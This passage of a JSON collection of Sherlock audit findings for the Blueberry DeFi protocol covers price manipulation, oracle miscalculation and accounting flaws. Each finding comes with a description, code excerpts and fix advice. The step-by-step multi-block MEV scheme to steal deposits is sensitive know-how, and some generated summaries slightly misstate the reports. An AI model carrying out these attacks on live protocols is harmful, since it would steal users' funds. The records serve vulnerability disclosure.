      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/220 \n\n## Found by \nRobert\n\n## Summary\nWhen depositing into an Ichi vault it allows a user to deposit all in a single token and determines the amount of vault shares they receive based off the price of that token in the second. This does not use twap but rather a combination of spot and twap in which it chooses the lesser of the two. There's protection against heavy manipulation occurring all on one block by checking if the difference between the two is greater than 5%, and failing if it is and if the last price change happened on the current block, but if the last price change was on a previous block it does not revert.\n\nMulti-block MEV allows malicious actors to manipulate price over multiple blocks with no risk at all. They can easily manipulate token price down to near 0 on one block, a user tries to deposit on the next and gets almost $0 worth of vault shares for their tokens, vault shareholders pocket the extra tokens from the user's deposit, and token price is returned. With this, a user depositing into Blueberry could have their entire deposit stolen by a malicious actor. \n\nThis is fairly easy to do now if you see your own block coming up, manipulate price through MEV on the block before that, then include victim transaction and repayment on your own block right after that (not technically needing MMEV). It will be even easier in the future when MMEV is included in Flashbots.\n\n## Vulnerability Detail\n0. Malicious attacker has validator or uses MMEV through flashbots.\n1. Directly before a block they fully control, the validator manipulates token0 price in the LP pool to next to nothing.\n2. On the next block, attacker flash loans a large amount of tokens to purchase Ichi Vault shares.\n3. Attacker includes all pending user deposits into the pool that use that token. Each of these returns to the user almost nothing.\n4. Attacker withdraws shares and included are the tokens that were stolen from users.\n\n## Impact\nUser deposits will be stolen.\n\n## Code Snippet\nPrice check only reverting on a large change if the block is the same as now:\nhttps://etherscan.io/token/0x2a8E09552782563f7A076ccec0Ff39473B91Cd8F#code#L2807\n\nAmount of shares relying on price:\nhttps://etherscan.io/token/0x2a8E09552782563f7A076ccec0Ff39473B91Cd8F#code#L2829\n\n## Tool used\nManual Review\n\n## Recommendation\nCheck spot and twap price the same way IchiVault does but ensure they are within an allowed delta regardless of when price was last updated.\n\n## Discussion\n\n**SergeKireev**\n\nEscalate for 31 USDC\n\nThis strategy is invalid since the validator would expose a big amount of their own funds(*) to being arbitraged away during the block before the one they control (they imbalance the pool during a block which they do not control according to the report). Since generalized MEV searchers are highly efficient the probability of the validator losing their funds in that exact block is higher than not.\n\n\\(*) They have to use their own funds in the first block because flash loan cannot be used accross blocks obviously\n\nFor this attack to work the validator would need to control fully two consecutive blocks, which makes it highely unlikely and thus the risk should be considered very low (comparable to for example continued price manipulation of uniswap pools).\n\n\n**sherlock-admin**\n\n > Escalate for 31 USDC\n> \n> This strategy is invalid since the validator would expose a big amount of their own funds(*) to being arbitraged away during the block before the one they control (they imbalance the pool during a block which they do not control according to the report). Since generalized MEV searchers are highly efficient the probability of the validator losing their funds in that exact block is higher than not.\n> \n> \\(*) They have to use their own funds in the first block because flash loan cannot be used accross blocks obviously\n> \n> For this attack to work the validator would need to control fully two consecutive blocks, which makes it highely unlikely and thus the risk should be considered very low (comparable to for example continued price manipulation of uniswap pools).\n> \n\nYou've created a valid escalation for 31 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nWhile this issue is not invalid, accepting this escalation on the basis of lowering the impact of this issue. \nAfter discussing internally, given the complex nature of the attack as well precondition of a controlling multi-block MEV &  the requirement that attacker would have to use large amounts of their own funds to be able to execute this, \nconsidering this issue as a Valid Medium\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> While this issue is not invalid, accepting this escalation on the basis of lowering the impact of this issue. \n> After discussing internally, given the complex nature of the attack as well precondition of a controlling multi-block MEV &  the requirement that attacker would have to use large amounts of their own funds to be able to execute this, \n> considering this issue as a Valid Medium\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about a potential attack on an Ichi Vault, a type of cryptocurrency vault, which could allow malicious actors to manipulate the price of a token and steal user deposits. The attack works by manipulating the price of a token in the second before a block they fully control, then flash loaning a large amount of tokens to purchase Ichi Vault shares. This includes all pending user deposits into the pool, which return to the user almost nothing. The attacker then withdraws the shares and stolen tokens.\n\nThe issue was found by Robert and the code snippet that was provided shows that the price check only reverts on a large change if the block is the same as now, and the amount of shares relies on the price. The impact of this vulnerability is that user deposits will be stolen, and the tool used was Manual Review. The recommendation to address this vulnerability is to check the spot and twap price the same way IchiVault does but ensure they are within an allowed delta regardless of when the price was last updated.\n\nThe discussion in the bug report includes two escalations for 31 USDC. The first is that the strategy is invalid since the validator would expose a big amount of their own funds to being arbitraged away during the block before the one they control. The second is that the issue is accepted on the basis of lowering the impact of this issue, given the complex nature of the attack and the requirement that the attacker would have to use large amounts of their own funds to be able to execute this. Both of these escalations were accepted and contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/220",
      "tags": [],
      "finders": [
        "Robert"
      ]
    },
    {
      "id": "6650",
      "title": "M-3: IchiLpOracle returns inflated price due to invalid calculation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/254 \n\n## Found by \nsakshamguruji, tives, peanuts\n\n## Summary\n\n`IchiLpOracle` returns inflated price due to invalid calculation\n\n## Vulnerability Detail\n\nIf you run the tests, then you can see that IchiLpOracle returns inflated price for the ICHI_USDC vault\n\n```solidity\nSTATICCALL IchiLpOracle.getPrice(token=0xFCFE742e19790Dd67a627875ef8b45F17DB1DaC6) => (1101189125194558706411110851447)\n```\n\nAs the documentation says, the token price should be in USD with 18 decimals of precision. The price returned here is `1101189125194_558706411110851447` This is 1.1 trillion USD when considering the 18 decimals. \n\nThe test uses real values except for mocking ichi and usdc price, which are returned by the mock with correct decimals (1e18 and 1e6)\n\n## Impact\n\n`IchiLpOracle` price is used in `_validateMaxLTV` (collToken is the vault). Therefore the collateral value is inflated and users can open bigger positions than their collateral would normally allow.\n\n## Code Snippet\n\n```solidity\n/**\n * @notice Return lp token price in USD, with 18 decimals of precision.\n * @param token The underlying token address for which to get the price.\n * @return Price in USD\n */\nfunction getPrice(address token) external view override returns (uint256) {\n    IICHIVault vault = IICHIVault(token);\n    uint256 totalSupply = vault.totalSupply();\n    if (totalSupply == 0) return 0;\n\n    address token0 = vault.token0();\n    address token1 = vault.token1();\n\n    (uint256 r0, uint256 r1) = vault.getTotalAmounts();\n    uint256 px0 = base.getPrice(address(token0));\n    uint256 px1 = base.getPrice(address(token1));\n    uint256 t0Decimal = IERC20Metadata(token0).decimals();\n    uint256 t1Decimal = IERC20Metadata(token1).decimals();\n\n    uint256 totalReserve = (r0 * px0) /\n        10**t0Decimal +\n        (r1 * px1) /\n        10**t1Decimal;\n\n    return (totalReserve * 1e18) / totalSupply;\n}\n```\n[link](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/IchiLpOracle.sol/#L38)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nFix the LP token price calculation. The problem is that you multiply totalReserve with extra 1e18 (`return (totalReserve * 1e18) / totalSupply;)`.\n\n## Discussion\n\n**Gornutz**\n\nduplicate of 15",
      "summary": "\nThis bug report is about an issue found in `IchiLpOracle`, which is a part of the Sherlock Audit project. The issue is that the `IchiLpOracle` returns an inflated price due to an invalid calculation. This is seen when running tests, which show that the `IchiLpOracle` returns a price of `1101189125194_558706411110851447` for the ICHI_USDC vault, when the price should be in USD with 18 decimals of precision. The problem is that the code multiplies totalReserve with an extra 1e18. \n\nThe impact of this issue is that `IchiLpOracle` price is used in `_validateMaxLTV`, which means that the collateral value is inflated and users can open bigger positions than their collateral would normally allow. The issue was found by sakshamguruji, tives, and peanuts, and the tool used was manual review. The recommendation is to fix the LP token price calculation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/254",
      "tags": [],
      "finders": [
        "sakshamguruji",
        "tives",
        "peanuts"
      ]
    },
    {
      "id": "6649",
      "title": "M-2: Liquidations are enabled when repayments are disabled, causing borrowers to lose funds without a chance to repay",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/290 \n\n## Found by \nJeiwan, Nyx\n\n## Summary\nDebt repaying can be temporary disabled by the admin of `BlueBerryBank`, however liquidations are not disabled during this period. As a result, users' positions can accumulate more borrow interest, go above the liquidation threshold, and be liquidated, while users aren't able to repay the debts.\n## Vulnerability Detail\nThe owner of [BlueBerryBank](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L22) can disable different functions of the contract, [including repayments](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L233-L235). However, while [repayments are disabled](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L747) liquidations are still [allowed](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L516-L517). As a result, when repayments are disabled, liquidator can liquidate any position, and borrowers won't be able to protect against that by repaying their debts. Thus, borrowers will be forced to lose their collateral.\n## Impact\nPositions will be forced to liquidations while their owners won't be able to repay debts to avoid liquidations.\n## Code Snippet\n[BlueBerryBank.sol#L740](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L740)\n## Tool used\nManual Review\n## Recommendation\nConsider disallowing liquidations when repayments are disabled. Alternatively, consider never disallowing repayments so that users could maintain their positions in a healthy risk range anytime.",
      "summary": "\nThis bug report is about an issue found in the BlueBerryBank contract. The issue is that when repayments are disabled by the admin, liquidations are still allowed. This means that borrowers cannot repay their debts and are forced to lose their collateral. This was found by Jeiwan and Nyx through manual review. The code snippet that is relevant to this issue is located at BlueBerryBank.sol#L740. The impact of this issue is that positions will be forced to liquidations while their owners won't be able to repay debts to avoid liquidations. The recommendation to fix this issue is to consider disallowing liquidations when repayments are disabled, or alternatively, to consider never disallowing repayments so that users could maintain their positions in a healthy risk range anytime.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/290",
      "tags": [
        "Liquidation"
      ],
      "finders": [
        "Jeiwan",
        "Nyx"
      ]
    },
    {
      "id": "6648",
      "title": "M-1: The maximum size of an `ICHI` vault spell position can be arbitrarily surpassed",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/327 \n\n## Found by \nberndartmueller, koxuan, rvierdiiev, rbserver\n\n## Summary\n\nThe maximum size of an `ICHI` vault spell position can be arbitrarily surpassed by subsequent deposits to a position due to a flaw in the `curPosSize` calculation.\n\n## Vulnerability Detail\n\nIchi vault spell positions are subject to a maximum size limit to prevent large positions, ensuring a wide margin for liquidators and bad debt prevention for the protocol.\n\nThe maximum position size is enforced in the `IchiVaultSpell.depositInternal` function and compared to the current position size `curPosSize`.\n\nHowever, the `curPosSize` does not reflect the actual position size, but the amount of Ichi vault LP tokens that are currently held in the `IchiVaultSpell` contract (see [L153](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L153)).\n\nAssets can be repeatedly deposited into an Ichi vault spell position using the `IchiVaultSpell.openPosition` function (via the `BlueBerryBank.execute` function).\n\nOn the very first deposit, the `curPosSize` correctly reflects the position size. However, on subsequent deposits, the previously received Ichi vault LP tokens are kept in the `BlueBerryBank` contract. Thus, checking the balance of `vault` tokens in the `IchiVaultSpell` contract only accounts for the current deposit.\n\n### Test case\n\nTo demonstrate this issue, please use the following test case:\n\n```diff\ndiff --git a/test/spell/ichivault.spell.test.ts b/test/spell/ichivault.spell.test.ts\nindex 258d653..551a6eb 100644\n--- a/test/spell/ichivault.spell.test.ts\n+++ b/test/spell/ichivault.spell.test.ts\n@@ -163,6 +163,26 @@ describe('ICHI Angel Vaults Spell', () => {\n                                afterTreasuryBalance.sub(beforeTreasuryBalance)\n                        ).to.be.equal(depositAmount.mul(50).div(10000))\n                })\n+               it(\"should revert when exceeds max pos size due to increasing position\", async () => {\n+                       await ichi.approve(bank.address, ethers.constants.MaxUint256);\n+                       await bank.execute(\n+                               0,\n+                               spell.address,\n+                               iface.encodeFunctionData(\"openPosition\", [\n+                                       0, ICHI, USDC, depositAmount.mul(4), borrowAmount.mul(6) // Borrow 1.800e6 USDC\n+                               ])\n+                       );\n+\n+                       await expect(\n+                               bank.execute(\n+                                       0,\n+                                       spell.address,\n+                                       iface.encodeFunctionData(\"openPosition\", [\n+                                               0, ICHI, USDC, depositAmount.mul(1), borrowAmount.mul(2) // Borrow 300e6 USDC\n+                                       ])\n+                               )\n+                       ).to.be.revertedWith(\"EXCEED_MAX_POS_SIZE\"); // 1_800e6 + 300e6 = 2_100e6 > 2_000e6 strategy max position size limit\n+               })\n                it(\"should be able to return position risk ratio\", async () => {\n                        let risk = await bank.getPositionRisk(1);\n                        console.log('Prev Position Risk', utils.formatUnits(risk, 2), '%');\n```\n\nRun the test with the following command:\n\n```bash\nyarn hardhat test --grep \"should revert when exceeds max pos size due to increasing position\"\n```\n\nThe test case fails and therefore shows that the maximum position size can be exceeded **without reverting**.\n\n## Impact\n\nThe maximum position size limit can be exceeded, leading to potential issues with liquidations and bad debt accumulation.\n\n## Code Snippet\n\n[spell/IchiVaultSpell.sol#L152-L156](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L152-L156)\n\n```solidity\n122: function depositInternal(\n123:     uint256 strategyId,\n124:     address collToken,\n125:     address borrowToken,\n126:     uint256 collAmount,\n127:     uint256 borrowAmount\n128: ) internal {\n...      // [...]\n147:\n148:     // 4. Validate MAX LTV\n149:     _validateMaxLTV(strategyId);\n150:\n151:     // 5. Validate Max Pos Size\n152:     uint256 lpPrice = bank.oracle().getPrice(strategy.vault);\n153:     uint256 curPosSize = (lpPrice * vault.balanceOf(address(this))) /\n154:         10**IICHIVault(strategy.vault).decimals();\n155:     if (curPosSize > strategy.maxPositionSize)\n156:         revert EXCEED_MAX_POS_SIZE(strategyId);\n157: }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider determining the current position size using the `bank.getPositionValue()` function instead of using the current Ichi vault LP token balance.",
      "summary": "\nThis bug report is about a flaw in the calculation of the maximum size of an `ICHI` vault spell position, which can be arbitrarily surpassed by subsequent deposits to a position. The maximum position size is enforced in the `IchiVaultSpell.depositInternal` function and compared to the current position size `curPosSize`. However, the `curPosSize` does not reflect the actual position size, but the amount of Ichi vault LP tokens that are currently held in the `IchiVaultSpell` contract. This means that assets can be repeatedly deposited into an Ichi vault spell position, but the `curPosSize` only accounts for the current deposit.\n\nA test case was provided to demonstrate this issue, which fails, showing that the maximum position size can be exceeded without reverting. The impact of this issue is that the maximum position size limit can be exceeded, leading to potential issues with liquidations and bad debt accumulation.\n\nThe code snippet provided is from the `IchiVaultSpell.sol` contract, specifically lines 152-156. The recommendation is to consider determining the current position size using the `bank.getPositionValue()` function instead of using the current Ichi vault LP token balance.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/327",
      "tags": [],
      "finders": [
        "berndartmueller",
        "rvierdiiev",
        "koxuan",
        "rbserver"
      ]
    },
    {
      "id": "6647",
      "title": "H-10: IchiLpOracle is extemely easy to manipulate due to how IchiVault calculates underlying token balances",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/20 \n\n## Found by \ncarrot, obront, ctf\\_sec, cergyk, banditx0x, psy4n0n, 0x52\n\n## Summary\n\n`IchiVault#getTotalAmounts` uses the `UniV3Pool.slot0` to determine the number of tokens it has in it's position. `slot0` is the most recent data point and is therefore extremely easy to manipulate. Given that the protocol specializes in leverage, the effects of this manipulation would compound to make malicious uses even easier.\n\n## Vulnerability Detail\n\n[ICHIVault.sol](https://etherscan.io/token/0x683f081dbc729dbd34abac708fa0b390d49f1c39#code#L3098)\n\n    function _amountsForLiquidity(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 liquidity\n    ) internal view returns (uint256, uint256) {\n        (uint160 sqrtRatioX96, , , , , , ) = IUniswapV3Pool(pool).slot0();\n        return\n            UV3Math.getAmountsForLiquidity(\n                sqrtRatioX96,\n                UV3Math.getSqrtRatioAtTick(tickLower),\n                UV3Math.getSqrtRatioAtTick(tickUpper),\n                liquidity\n            );\n    }\n\n`IchiVault#getTotalAmounts` uses the `UniV3Pool.slot0` to determine the number of tokens it has in it's position. [slot0](https://docs.uniswap.org/contracts/v3/reference/core/interfaces/pool/IUniswapV3PoolState#slot0) is the most recent data point and can easily be manipulated.\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/IchiLpOracle.sol#L27-L36\n\n`IchiLPOracle` directly uses the token values returned by `vault#getTotalAmounts`. This allows a malicious user to manipulate the valuation of the LP. An example of this kind of manipulation would be to use large buys/sells to alter the composition of the LP to make it worth less or more. \n\n## Impact\n\nIchi LP value can be manipulated to cause loss of funds for the protocol and other users\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nToken balances should be calculated inside the oracle instead of getting them from the `IchiVault`. To determine the liquidity, use a TWAP instead of `slot0`.",
      "summary": "\nThis bug report is about the issue H-10 concerning the IchiLpOracle, an Ethereum-based protocol. It was found by seven people: carrot, obront, ctf_sec, cergyk, banditx0x, psy4n0n, and 0x52. The issue is that the IchiVault#getTotalAmounts uses the UniV3Pool.slot0 to determine the number of tokens it has in its position, which is the most recent data point and is extremely easy to manipulate. This manipulation would compound to make malicious uses even easier. This manipulation can cause loss of funds for the protocol and other users. \n\nTo fix this issue, it is recommended that token balances should be calculated inside the oracle instead of getting them from the IchiVault. To determine the liquidity, use a TWAP instead of slot0. The tool used for finding this issue was manual review.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/20",
      "tags": [
        "Uniswap",
        "Stale Price"
      ],
      "finders": [
        "cergyk",
        "0x52",
        "psy4n0n",
        "bitx0x",
        "obront",
        "carrot",
        "ctf\\_sec"
      ]
    },
    {
      "id": "6646",
      "title": "H-9: BlueBerryBank#withdrawLend will cause underlying token accounting error if soft/hard vault has withdraw fee",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/33 \n\n## Found by \ny1cunhui, rvierdiiev, csanuragjain, Ruhum, evan, 0x52\n\n## Summary\n\nSoft/hard vaults can have a withdraw fee. This takes a certain percentage from the user when they withdraw. The way that the token accounting works in BlueBerryBank#withdrawLend, it will only remove the amount returned by the hard/soft vault from pos.underlying amount. If there is a withdraw fee, underlying amount will not be decrease properly and the user will be left with phantom collateral that they can still use.\n\n## Vulnerability Detail\n\n        // Cut withdraw fee if it is in withdrawVaultFee Window (2 months)\n        if (\n            block.timestamp <\n            config.withdrawVaultFeeWindowStartTime() +\n                config.withdrawVaultFeeWindow()\n        ) {\n            uint256 fee = (withdrawAmount * config.withdrawVaultFee()) /\n                DENOMINATOR;\n            uToken.safeTransfer(config.treasury(), fee);\n            withdrawAmount -= fee;\n        }\n\nBoth SoftVault and HardVault implement a withdraw fee. Here we see that withdrawAmount (the return value) is decreased by the fee amount.\n\n        uint256 wAmount;\n        if (address(ISoftVault(bank.softVault).uToken()) == token) {\n            ISoftVault(bank.softVault).approve(\n                bank.softVault,\n                type(uint256).max\n            );\n            wAmount = ISoftVault(bank.softVault).withdraw(shareAmount);\n        } else {\n            wAmount = IHardVault(bank.hardVault).withdraw(token, shareAmount);\n        }\n\n        wAmount = wAmount > pos.underlyingAmount\n            ? pos.underlyingAmount\n            : wAmount;\n\n        pos.underlyingVaultShare -= shareAmount;\n        pos.underlyingAmount -= wAmount;\n        bank.totalLend -= wAmount;\n\nThe return value is stored as `wAmount` which is then subtracted from `pos.underlyingAmount` the issue is that the withdraw fee has now caused a token accounting error for `pos`. We see that the fee paid to the hard/soft vault is NOT properly removed from `pos.underlyingAmount`. This leaves the user with phantom underlying which doesn't actually exist but that the user can use to take out loans.\n\nExmaple:\nFor simplicity let's say that 1 share = 1 underlying and the soft/hard vault has a fee of 5%. Imagine a user deposits 100 underlying to receive 100 shares. Now the user withdraws their 100 shares while the hard/soft vault has a withdraw. This burns 100 shares and softVault/hardVault.withdraw returns 95 (100 - 5). During the token accounting pos.underlyingVaultShares are decreased to 0 but pos.underlyingAmount is still equal to 5 (100 - 95).\n\n      uint256 cv = oracle.getUnderlyingValue(\n          pos.underlyingToken,\n          pos.underlyingAmount\n      );\n\nThis accounting error is highly problematic because collateralValue uses pos.underlyingAmount to determine the value of collateral for liquidation purposes. This allows the user to take on more debt than they should.\n\n## Impact\n\nUser is left with collateral that isn't real but that can be used to take out a loan\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L669-L704\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`HardVault/SoftVault#withdraw` should also return the fee paid to the vault, so that it can be accounted for.",
      "summary": "\nThis bug report is about an issue found in BlueBerryBank#withdrawLend that can cause a token accounting error if a soft/hard vault has a withdraw fee. The issue is that the withdraw fee is not taken into account when the user withdraws their shares, leading to an incorrect calculation of the underlying amount for the user. This can lead to the user having phantom collateral that can be used to take out loans, but is not actually real. \n\nThe issue was found by y1cunhui, rvierdiiev, csanuragjain, Ruhum, evan, and 0x52, and was found through manual review. The code snippet of the affected area is available at https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L669-L704.\n\nThe recommendation is that HardVault/SoftVault#withdraw should also return the fee paid to the vault, so that it can be accounted for. This would ensure that the underlying amount is correctly calculated and that the user does not have phantom collateral.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/33",
      "tags": [
        "Withdraw Pattern",
        "Missing-Logic",
        "Coding-Bug"
      ],
      "finders": [
        "csanuragjain",
        "0x52",
        "y1cunhui",
        "Ruhum",
        "evan",
        "rvierdiiev"
      ]
    },
    {
      "id": "6645",
      "title": "H-8: Interest component of underlying amount is not withdrawable using the `withdrawLend` function. Such amount is permanently locked in the BlueBerryBank contract",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/109 \n\n## Found by \nberndartmueller, carrot, minhtrng, 0Kage, Jeiwan, chaduke, koxuan, Ruhum, cergyk, rbserver, stent, saian, XKET, GimelSec\n\n## Summary\nSoft vault shares are issued against interest bearing tokens issued by `Compound` protocol in exchange for underlying deposits. However, `withdrawLend` function caps the withdrawable amount to initial underlying deposited by user (`pos.underlyingAmount`). Capping underlying amount to initial underlying deposited would mean that a user can burn all his vault shares in `withdrawLend` function and only receive original underlying deposited.\n\nInterest accrued component received from Soft vault (that rightfully belongs to the user) is no longer retrievable because the underlying vault shares are already burnt. Loss to the users is permanent as such interest amount sits permanently locked in Blueberry bank.\n\n## Vulnerability Detail\n\n[`withdrawLend` function in `BlueBerryBank`](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L669) allows users to withdraw underlying amount from `Hard` or `Soft` vaults. `Soft` vault shares are backed by interest bearing `cTokens` issued by Compound Protocol\n\nUser can request underlying by specifying `shareAmount`. When user tries to send the maximum `shareAmount` to withdraw all the lent amount, notice that the amount withdrawable is limited to the `pos.underlyingAmount` (original deposit made by the user).\n\nWhile this is the case, notice also that the full `shareAmount` is deducted from `underlyingVaultShare`. User cannot recover remaining funds because in the next call, user doesn't have any vault shares against his address. Interest accrued component on the underlying that was returned by `SoftVault` to `BlueberryBank` never makes it back to the original lender.\n\n```solidity\n    wAmount = wAmount > pos.underlyingAmount\n            ? pos.underlyingAmount\n            : wAmount;\n\n        pos.underlyingVaultShare -= shareAmount;\n        pos.underlyingAmount -= wAmount;\n        bank.totalLend -= wAmount;\n```\n\n## Impact\nEvery time, user withdraws underlying from a Soft vault, interest component gets trapped in BlueBerry contract. Here is a scenario.\n\n- Alice deposits 1000 USDC into `SoftVault` using the `lend` function of BlueberryBank at T=0\n- USDC soft vault mints 1000 shares to Blueberry bank\n- USDC soft vault deposits 1000 USDC into Compound & receives 1000 cUSDC\n- Alice at T=60 days requests withdrawal against 1000 Soft vault shares\n- Soft Vault burns 1000 soft vault shares and requests withdrawal from Compound against 1000 cTokens\n- Soft vault receives 1050 USDC (50 USDC interest) and sends this to BlueberryBank\n- Blueberry Bank caps the withdrawal amount to 1000 (original deposit)\n- Blueberry Bank deducts 0.5% withdrawal fees and deposits 995 USDC back to user\n\nIn the whole process, Alice has lost access to 50 USDC.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L693\n\n## Tool used\nManual Review\n\n## Recommendation\nIntroduced a new variable to adjust positions & removed cap on withdraw amount.\n\nHighlighted changes I recommend to withdrawLend with //******//.\n\n```solidity\nfunction withdrawLend(address token, uint256 shareAmount)\n        external\n        override\n        inExec\n        poke(token)\n    {\n        Position storage pos = positions[POSITION_ID];\n        Bank storage bank = banks[token];\n        if (token != pos.underlyingToken) revert INVALID_UTOKEN(token);\n        \n        //*********-audit cap shareAmount to maximum value, pos.underlyingVaultShare*******\n        if (shareAmount > pos.underlyingVaultShare) {\n            shareAmount = pos.underlyingVaultShare;\n        }\n\n        // if (shareAmount == type(uint256).max) {\n        //     shareAmount = pos.underlyingVaultShare;\n        // }        \n\n        uint256 wAmount;\n        uint256 amountToOffset; //*********- audit added this to adjust position********\n        if (address(ISoftVault(bank.softVault).uToken()) == token) {\n            ISoftVault(bank.softVault).approve(\n                bank.softVault,\n                type(uint256).max\n            );\n            wAmount = ISoftVault(bank.softVault).withdraw(shareAmount);\n        } else {\n            wAmount = IHardVault(bank.hardVault).withdraw(token, shareAmount);\n        }\n\n        //*********- audit calculate amountToOffset********\n        //*********-audit not capping wAmount anymore*******\n        amountToOffset = wAmount > pos.underlyingAmount\n            ? pos.underlyingAmount\n            : wAmount;\n\n        pos.underlyingVaultShare -= shareAmount;\n     //*********-audit subtract amountToOffset instead of wAmount*******\n        pos.underlyingAmount -= amountToOffset;\n        bank.totalLend -= amountToOffset;\n\n        wAmount = doCutWithdrawFee(token, wAmount);\n\n        IERC20Upgradeable(token).safeTransfer(msg.sender, wAmount);\n    }\n```",
      "summary": "\nThis bug report is about an issue with the `withdrawLend` function in the BlueBerryBank contract. This function is used to withdraw underlying amount from Hard or Soft vaults, and is backed by interest bearing tokens issued by Compound Protocol. The issue is that when a user tries to withdraw the maximum amount to withdraw all the lent amount, the amount withdrawable is limited to the initial underlying deposited by the user (`pos.underlyingAmount`). This means that interest accrued component received from Soft vault (that rightfully belongs to the user) is no longer retrievable because the underlying vault shares are already burnt, resulting in a permanent loss to the users.\n\nThe bug was found by berndartmueller, carrot, minhtrng, 0Kage, Jeiwan, chaduke, koxuan, Ruhum, cergyk, rbserver, stent, saian, XKET, and GimelSec. Manual review was used as the tool for finding the bug.\n\nTo illustrate the impact of the bug, an example of Alice is given. Alice deposits 1000 USDC into SoftVault using the `lend` function of BlueberryBank at T=0. USDC soft vault mints 1000 shares to Blueberry bank, and USDC soft vault deposits 1000 USDC into Compound & receives 1000 cUSDC. At T=60 days, Alice requests withdrawal against 1000 Soft vault shares. Soft Vault burns 1000 soft vault shares and requests withdrawal from Compound against 1000 cTokens. Soft vault receives 1050 USDC (50 USDC interest) and sends this to BlueberryBank. Blueberry Bank caps the withdrawal amount to 1000 (original deposit) and deducts 0.5% withdrawal fees and deposits 995 USDC back to user. In the whole process, Alice has lost access to 50 USDC.\n\nThe recommendation given to fix the bug is to introduce a new variable to adjust positions and remove the cap on the withdraw amount. A code snippet with the highlighted changes is provided.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/109",
      "tags": [
        "Withdraw Pattern",
        "Missing-Logic",
        "Fund Lock",
        "Coding-Bug"
      ],
      "finders": [
        "cergyk",
        "stent",
        "rbserver",
        "XKET",
        "Jeiwan",
        "koxuan",
        "Ruhum",
        "berndartmueller",
        "GimelSec",
        "saian",
        "chaduke",
        "minhtrng",
        "carrot",
        "0Kage"
      ]
    },
    {
      "id": "6644",
      "title": "H-7: Users can be liquidated prematurely because calculation understates value of underlying position",
      "impact": "HIGH",
